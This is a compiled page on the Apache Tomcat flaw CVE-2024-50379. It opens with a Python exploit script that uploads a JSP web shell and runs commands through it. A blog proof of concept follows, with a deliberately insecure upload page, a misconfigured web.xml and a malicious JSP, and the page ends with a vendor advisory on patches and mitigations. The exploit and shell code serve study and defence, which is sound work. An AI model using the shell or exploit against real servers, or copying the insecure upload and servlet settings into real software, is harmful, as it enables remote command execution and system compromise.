CVE-2024-50379

##
#
https://github.com/v3153/CVE-2024-50379-POC
#
https://github.com/Alchemist3dot14/CVE-2024-50379
#
https://vulcan.io/blog/how-to-fix-cve-2024-50379/
#
https://github.com/advisories/GHSA-5j33-cvvr-w245
#
##



```
import requests
import sys

# Configurable variables
BASE_URL = "http://localhost:8080/uploads/"
UPLOAD_ENDPOINT = f"{BASE_URL}upload.jsp"
SHELL_NAME = "shell.jsp"
SHELL_CONTENT = '''
<%@ page import="java.io.*" %>
<%
    if (request.getParameter("cmd") != null) {
        String cmd = request.getParameter("cmd");
        Process p = Runtime.getRuntime().exec(cmd);
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String line;
        while ((line = dis.readLine()) != null) {
            out.println(line);
        }
    }
%>
'''

def upload_shell():
    print("[+] Uploading JSP shell...")
    files = {'file': (SHELL_NAME, SHELL_CONTENT, 'application/octet-stream')}
    response = requests.post(UPLOAD_ENDPOINT, files=files)
    if response.status_code == 200:
        print(f"[+] Shell uploaded successfully. Check the URL: {BASE_URL}uploads/{SHELL_NAME}")
        return True
    else:
        print("[-] Failed to upload shell.")
        print(f"Response Code: {response.status_code}")
        print(f"Response Text: {response.text}")
        return False

def execute_command(command):
    # Correct shell URL
    shell_url = f"{BASE_URL}uploads/{SHELL_NAME}"
    print(f"[+] Executing command: {command}")
    params = {'cmd': command}
    response = requests.get(shell_url, params=params)
    if response.status_code == 200:
        print("[+] Command output:")
        print(response.text)
    else:
        print("[-] Failed to execute command.")
        print(f"Response Code: {response.status_code}")
        print(f"Response Text: {response.text}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 exploit_cve_2024_50379.py <command>")
        sys.exit(1)

    command = sys.argv[1]
    if upload_shell():
        execute_command(command)
```


Deep Dive & POC of CVE-2024-50379 Exploit Tomcat Vulnerability (9.8 Severity)
Vidhi patel
Vidhi patel

·
Follow

5 min read
·
5 days ago
5


3



Introduction
In the ever-evolving landscape of cybersecurity, staying ahead of vulnerabilities is crucial for protecting sensitive systems. Recently, a critical security flaw — CVE-2024–50379 — was uncovered in Apache Tomcat, one of the most widely used web application servers globally. With a severity score of 9.8, this vulnerability poses a significant risk, potentially allowing attackers to execute arbitrary code and compromise affected systems.

This blog dives deep into the technical details of CVE-2024–50379, offering insights into its root cause, the potential impact, and real-world exploit scenarios. To better understand its implications, we’ll also walk through a Proof of Concept (POC) to demonstrate how attackers could exploit this flaw in unpatched systems.

By the end of this article, you’ll not only gain a thorough understanding of the vulnerability but also learn how to safeguard your Tomcat deployments against this critical threat. Let’s unravel the details and arm ourselves with the knowledge to stay secure.

CVE-2024–50379: Detailed Overview
Vulnerability Description
CVE-2024–50379 is a Time-of-check Time-of-use (TOCTOU) Race Condition vulnerability that occurs during JSP compilation in Apache Tomcat. This flaw permits a Remote Code Execution (RCE) on case-insensitive file systems under specific conditions.

To exploit this vulnerability, the default servlet must be enabled for write — a configuration that is not enabled by default. The issue affects the following Apache Tomcat versions:

11.0.0-M1 through 11.0.1
10.1.0-M1 through 10.1.33
9.0.0.M1 through 9.0.97
It is strongly recommended to upgrade to the fixed versions:

11.0.2
10.1.34
9.0.98
Severity Metrics
While this vulnerability is awaiting a full CVSS 4.0 Severity assessment, its potential for exploitation highlights the importance of addressing it immediately. The high severity score (9.8) underscores its criticality, particularly for systems with misconfigured settings.

Key References
Further details, including advisories and mitigation steps, can be found in the following resources:

OpenWall Security Advisory — 12/17/2024
OpenWall Security Advisory — 12/18/2024
Apache Tomcat Official Advisory
Proof of Concept (POC)
To demonstrate the exploitation of CVE-2024–50379, we create a controlled scenario involving:

Uploading a harmless JSP file to a Tomcat server.
Overwriting it with a malicious JSP file leveraging the TOCTOU race condition.
Since Windows has a case-insensitive file system, file.jsp and FILE.JSP are treated as the same file. Hence, the older file simply gets replaced when a new file is uploaded. In Linux, this wouldn't be the case as both file.jsp and FILE.JSP would be treated as two different files.


Disclaimer: This demonstration is for educational purposes only and should be performed in a secure, isolated lab environment. Never deploy such insecure configurations in production environments.

Set Up a JSP Webpage for File Upload
We create a simple JSP webpage (upload.jsp) that allows file uploads to the Tomcat server.

<%@ page import="java.io.*, java.util.*" %>
<%@ page import="javax.servlet.http.Part" %>
<!DOCTYPE html>
<html>
<head>
    <title>File Upload</title>
</head>
<body>
    <h1>Upload a JSP File</h1>
    <form action="upload.jsp" method="post" enctype="multipart/form-data">
        <label for="file">Choose JSP File:</label>
        <input type="file" name="file" id="file" accept=".jsp"><br><br>
        <input type="submit" value="Upload File">
    </form>

    <%
        if ("POST".equalsIgnoreCase(request.getMethod())) {
            Part filePart = request.getPart("file");
            String fileName = filePart.getSubmittedFileName();
            String uploadPath = application.getRealPath("/") + "uploads/";

            File uploadDir = new File(uploadPath);
            if (!uploadDir.exists()) uploadDir.mkdirs();

            try (InputStream inputStream = filePart.getInputStream();
                 FileOutputStream outputStream = new FileOutputStream(uploadPath + fileName)) {
                byte[] buffer = new byte[1024];
                int bytesRead;
                while ((bytesRead = inputStream.read(buffer)) != -1) {
                    outputStream.write(buffer, 0, bytesRead);
                }
                out.println("<p>File uploaded successfully to: " + uploadPath + fileName + "</p>");
            } catch (Exception e) {
                out.println("<p>Error uploading file: " + e.getMessage() + "</p>");
            }
        }
    %>
</body>
</html>
This JSP script:

Accepts .jsp files for upload.
Saves the uploaded files to the uploads/ directory in the server root.
Changes in web.xml File

To exploit CVE-2024–50379, modifications in the web.xml file can help enable the Default Servlet to process uploads with write permissions. This misconfiguration allows attackers to upload malicious files like FILE.JSP, which could replace existing files with unintended consequences.

In a default setup, the Default Servlet typically does not allow write access. However, when configured with incorrect permissions, it allows files to be overwritten, making it susceptible to TOCTOU race conditions.

<!-- Example web.xml configuration to exploit CVE-2024-50379 -->

<web-app xmlns="http://java.sun.com/xml/ns/javaee" version="3.0">

    <!-- Default Servlet Configuration -->
    <servlet>
        <servlet-name>default</servlet-name>
        <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>
        <init-param>
            <param-name>readonly</param-name>
            <param-value>false</param-value> <!-- Misconfiguration: Enables write permissions -->
        </init-param>
        <init-param>
            <param-name>fileEncoding</param-name>
            <param-value>UTF-8</param-value>
        </init-param>
        <load-on-startup>1</load-on-startup>
    </servlet>

    <servlet-mapping>
        <servlet-name>default</servlet-name>
        <url-pattern>/uploads/*</url-pattern>
    </servlet-mapping>

    <!-- Security Misconfiguration: Allow JSP File Uploads -->
    <servlet>
        <servlet-name>FileUploadServlet</servlet-name>
        <jsp-file>/upload.jsp</jsp-file>
        <multipart-config>
            <location>/tmp</location> <!-- Temporary upload directory -->
            <max-file-size>5242880</max-file-size> <!-- 5 MB -->
            <max-request-size>10485760</max-request-size> <!-- 10 MB -->
            <file-size-threshold>1024</file-size-threshold> <!-- 1 KB -->
        </multipart-config>
    </servlet>

    <servlet-mapping>
        <servlet-name>FileUploadServlet</servlet-name>
        <url-pattern>/upload.jsp</url-pattern>
    </servlet-mapping>

    <!-- Directory Browsing Enabled -->
    <init-param>
        <param-name>listings</param-name>
        <param-value>true</param-value>
    </init-param>

    <!-- Application Security Constraints (Optional and misconfigured) -->
    <security-constraint>
        <web-resource-collection>
            <web-resource-name>Unrestricted Uploads</web-resource-name>
            <url-pattern>/uploads/*</url-pattern>
        </web-resource-collection>
        <auth-constraint>
            <role-name>*</role-name> <!-- No restriction, allowing anonymous access -->
        </auth-constraint>
    </security-constraint>




</web-app>
P.S.: This vulnerability can only be exploited if specific changes are made to the web.xml file configuration. By default, the readonly parameter in Tomcat's DefaultServlet is set to true, which prevents write operations. Exploitation becomes possible only if this parameter is explicitly set to false, allowing write access to the servlet. Always review and secure your server configurations to mitigate such risks.

Exploiting the Race Condition
Upload a Harmless JSP File
Upload a simple hello.jsp file containing:

<% out.println("Hello, World!"); %>
Create a Malicious JSP File
Prepare a malicious JSP file (HELLO.JSP) to exploit the vulnerability:

<%@ page import="java.io.*" %>
<!DOCTYPE html>
<html>
<head>
    <title>Hello World JSP</title>
</head>
<body>
    <h1>Hello, World!</h1>
    <%
        try {
            // Execute the command to open calc.exe
            Process process = Runtime.getRuntime().exec("cmd /c start calc.exe");
            out.println("<p>Calculator has been opened successfully (if the server is running on Windows).</p>");
        } catch (Exception e) {
            out.println("<p>Error while opening calculator: " + e.getMessage() + "</p>");
        }
    %>
</body>
</html>
This file will open the Windows calculator (calc.exe) upon execution.

Overwrite the harmless hello.jsp with the malicious HELLO.JSP using a script.

Trigger the Vulnerability
Access http://localhost:8080/<your-app>/uploads/hello.jsp to trigger the malicious JSP execution.


Outcome
The malicious JSP file is executed, and the calculator application opens on the server (if running on Windows).
This demonstrates a successful RCE exploitation of the race condition.
Mitigations and Takeaways
Secure File Uploads: Avoid allowing JSP file uploads directly to directories served by the application.
Upgrade Apache Tomcat: Ensure your Tomcat server is running a patched version (e.g., 11.0.2, 10.1.34, or 9.0.98).
Configuration Review: Disable write permissions for the Default Servlet.
Special thanks to Shaurya for quick help.

Thank you so much for helping me with framing the article & all the motivation behind !


CVE-2024-50379: A Critical Time-of-Check Time-of-Use (TOCTOU) Vulnerability in Apache Tomcat
Apache Tomcat, one of the most widely used open-source web servers and servlet containers, has recently been found vulnerable to a critical security flaw, CVE-2024-50379. This vulnerability, with a CVSS score of 9.8, exposes systems to remote code execution (RCE) under specific configurations, making it a significant threat to enterprises relying on Tomcat for Java-based web applications. Read about the details of CVE-2024-50379, its impact and outline mitigation steps to secure your systems.

Yair Divinsky | December 25, 2024

In this article
TL;DR
What is the CVE-2024-50379?
CVE-2024-50379 and CVE-2024-56337: A Linked Vulnerability Path in Apache Tomcat
Does CVE-2024-50379 affect me?
Has CVE-2024-50379 been actively exploited in the wild?
How to fix CVE-2024-50379
Further reading
How exposed are you?
Assess the maturity level of your exposure management program

RSVP for free
A new critical vulnerability exposes systems to remote code execution (RCE) was recently discovered in Apache Tomcat, a well-known and common open-source web server and servlet container. The software has been found vulnerable to a critical security flaw possessing threat to enterprises relying on Tomcat for Java-based web applications. In this blog, we will explore the details of CVE-2024-50379, assess its impact, and outline mitigation steps.

TL;DR
Affected products: 

Apache Tomcat versions 11.0.0-M1 to 11.0.1, 10.1.0-M1 to 10.1.33, and 9.0.0.M1 to 9.0.97

Product category: 

Web Application Security 

Severity: 

Critical (CVSS Score: 9.8) 

Type: 

Time-of-check Time-of-use (TOCTOU) race condition vulnerability

Impact: 

Remote Code Execution (RCE)
PoC: 

 Link

Exploit in the wild 

No 

CISA Catalog 

 

Remediation action 

Upgrade Apache Tomcat to the fixed versions:
11.0.2 or later
10.1.34 or later
9.0.98 or later
Configure the Java system property sun.io.useCanonCaches to false for Java 8 or Java 11
If using Java 17, ensure sun.io.useCanonCaches is set to false if explicitly configured.
No additional action is needed for Java 21 or later.
MITRE advisory 

Link 

 

What is the CVE-2024-50379?
CVE-2024-50379 is a Time-of-Check Time-of-Use (TOCTOU) race condition vulnerability in Apache Tomcat. The flaw arises when Tomcat is configured to run on a case-insensitive file system with the default servlet’s write functionality enabled. This configuration can lead to scenarios where concurrent reads and uploads to the same file bypass Tomcat’s case sensitivity checks. 

As a result, attackers can exploit this loophole to execute arbitrary Java Server Pages (JSP) code, gaining unauthorized access to the system. 

 

Update: CVE-2024-50379 and CVE-2024-56337: A Linked Vulnerability Path in Apache Tomcat
CVE-2024-50379 is part of a broader issue in Apache Tomcat, with another vulnerability, CVE-2024-56337, acting as a follow-up to this initial flaw. Both vulnerabilities are classified as Time-of-Check Time-of-Use (TOCTOU) race conditions, a type of vulnerability where an action (in this case, file uploads and reads) occurs between the moment a check is made and the time the action is executed, opening a window for exploitation. 

Initially, the Apache Software Foundation (ASF) released a fix for CVE-2024-50379 on December 17, 2024, targeting the exploitation risk of arbitrary file uploads being treated as JSP code. This occurred when Tomcat was configured on case-insensitive file systems (e.g., Windows or macOS) with the default servlet’s write functionality enabled. However, soon after the release, it became evident that the patch didn’t fully address all edge cases, particularly on systems running older versions of Java. 

Thus, on December 23, 2024, Apache issued an additional update to fully mitigate the issue, tracked as CVE-2024-56337. This new fix clarifies the need for further manual configuration steps to ensure that all affected environments are properly secured, especially for users running older Java versions (Java 8 or Java 11). Without these additional steps, the vulnerability could still be exploited in certain configurations, despite the initial patch. 

The core of both CVEs lies in the same flaw: under certain configurations, concurrent file upload and read operations can bypass Tomcat’s case sensitivity checks, enabling an attacker to upload a file that is mistakenly treated as executable code, leading to remote code execution (RCE). To fully mitigate this, administrators must apply both the updated versions of Tomcat (11.0.2, 10.1.34, and 9.0.98 or later) and additional configuration changes depending on their Java environment. 

For systems running Java 8 or Java 11, administrators are advised to set the sun.io.useCanonCaches property to false. This action prevents Tomcat from mistakenly handling file paths inappropriately. On Java 17 systems, this property should be checked to ensure it’s set to false as well. No changes are needed for Java 21 and beyond, as the problematic property has been removed in those versions. 

With the release of CVE-2024-56337, Apache Tomcat users are now equipped with a comprehensive fix, addressing both the original flaw and any remaining vulnerabilities tied to older Java configurations. It’s crucial for administrators to implement both software and configuration updates to protect their environments from exploitation. 

 

Does CVE-2024-50379 affect me?
The vulnerability impacts the following Apache Tomcat versions: 

Apache Tomcat 11.0.0-M1 to 11.0.1 
Apache Tomcat 10.1.0-M1 to 10.1.33 
Apache Tomcat 9.0.0.M1 to 9.0.97 
You may be affected by CVE-2024-50379 if your systems meet the following conditions: 

Environment Configuration – Your Apache Tomcat server is running on a case-insensitive file system (e.g., Windows or macOS) and the default servlet’s readonly initialization parameter is set to false (non-default setting). 
Java Version – Systems using older Java versions (Java 8 or Java 11) are particularly at risk, as they require manual configuration to mitigate the issue. 
Use Case – Applications hosted on the affected Tomcat versions rely on concurrent file uploads or involve scenarios where file write operations are enabled. 
Administrators should review their configurations and assess if their systems align with these conditions to determine exposure. 

 

Has CVE-2024-50379 been actively exploited in the wild?
At the time of writing, there are no confirmed reports of active exploitation of CVE-2024-50379 in the wild. However, the Apache Software Foundation (ASF) has credited several security researchers for independently identifying and reporting the flaw, including proof-of-concept (PoC) code. 

The availability of PoC increases the likelihood of exploitation, especially in environments where mitigation steps have not been implemented.

 

How to fix CVE-2024-50379
To address CVE-2024-50379, Apache has released updates and provided detailed configuration changes to secure affected systems: 

Upgrade Apache Tomcat – Ensure you are running the patched versions of Apache Tomcat: 
Upgrade to version 11.0.2 or later
Upgrade to version 10.1.34 or later
Upgrade to version 9.0.98 or later.
Adjust System Properties Based on Java Version –  
For Java 8 or Java 11 – Set the system property sun.io.useCanonCaches to false (default: true)
For Java 17 – Verify that sun.io.useCanonCaches is set to false (default: false)
For Java 21 and Later – No action is required, as the sun.io.useCanonCaches property has been removed. 
Review Default Servlet Configuration – Check and modify the readonly parameter in the default servlet’s configuration to ensure it is set to true unless explicitly required for your use case. 
Monitor for Exploitation Attempts – Implement logging and monitoring mechanisms to detect anomalous file upload or read operations that could indicate exploitation attempts. 
 
By following these steps, you can significantly reduce the risk posed by CVE-2024-50379 and secure your systems against potential attacks. Stay vigilant and ensure that your systems are updated and properly configured to minimize vulnerabilities. For additional insights and updates, refer to the official Apache Tomcat security advisories.

By following these steps, you can significantly reduce the risk posed by CVE-2024-50379 and secure your systems against potential attacks. Stay vigilant and ensure that your systems are updated and properly configured to minimize vulnerabilities. For additional insights and updates, refer to the official Apache Tomcat security advisories. 

 

Further reading
Each new vulnerability is a reminder of where we stand, and what we need to do better. Check out the following resources to help you maintain cyber hygiene and stay ahead of the threat actors: 

Q3 2024 Vulnerability Watch 
IBM’s Cost of a Data Breach 2024: What we learned 
Fixing the RCE flaw in the Common Unix Printing System (CUPS) 
Vulnerability disclosure policy (and how to get it right) 
OpenSSH again? How to fix CVE-2024-7589


